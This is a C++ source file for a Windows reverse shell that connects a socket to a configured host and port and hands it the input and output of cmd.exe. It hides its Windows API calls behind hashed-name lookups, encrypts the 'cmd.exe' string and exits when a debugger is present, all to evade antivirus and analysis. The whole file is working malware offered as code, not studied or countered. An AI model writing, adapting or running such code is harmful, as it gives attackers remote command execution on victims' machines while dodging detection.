#include <iostream>
#include <type_traits>

#define WINUSERAPI 
#include <WinSock2.h>
#include <Windows.h>

#include "prng.h"
#include "loader.h"


#define HOST "127.0.0.1"
#define PORT 3333




WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

//https://stackoverflow.com/questions/14294271/forcing-a-constant-expression-to-be-evaluated-during-compile-time
#define COMPILATION_EVAL(e) (std::integral_constant<decltype(e), e>::value)

#define f(STR) h(e(STR).c_str())

#define g(STR) xxh32_consteval(STR,0)

#define LDR_CALL(fn, ...)  Loader::get_instance().call<decltype(&fn)>(xxh32_consteval(#fn, 0), __VA_ARGS__)
#define LDR_CALL0(fn)      Loader::get_instance().call<decltype(&fn)>(xxh32_consteval(#fn, 0))

int main()
{
	BOOL debugged = LDR_CALL0(IsDebuggerPresent);

	if (debugged) {
		LDR_CALL(MessageBoxA, nullptr, "I know what you are trying to do.", "Success", MB_OK);
		return 0;
	}

	LDR_CALL(MessageBoxA, nullptr, "PEB walk success", "Success", MB_OK);


	/// init socket lib
	LDR_CALL(WSAStartup, MAKEWORD(2, 2), &wsaData);


	//// create socket
	//wSock = pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)nullptr, (unsigned int)nullptr);
	wSock = LDR_CALL(WSASocketW,
		AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0
	);


	hax.sin_family = AF_INET;
	hax.sin_port = LDR_CALL(htons, PORT);
	hax.sin_addr.s_addr = LDR_CALL(inet_addr, HOST);

	//// connect to remote host
	LDR_CALL(WSAConnect,
		wSock, (sockaddr*)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr
	);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = STARTF_USESTDHANDLES;
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;


	wchar_t proc[8];
	wcscpy_s(proc, 8, make_encrypted_wstring(L"cmd.exe").c_str());
	LDR_CALL(CreateProcessW,
		nullptr, proc, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sui, &pi
	);
	
	
	exit(0);
}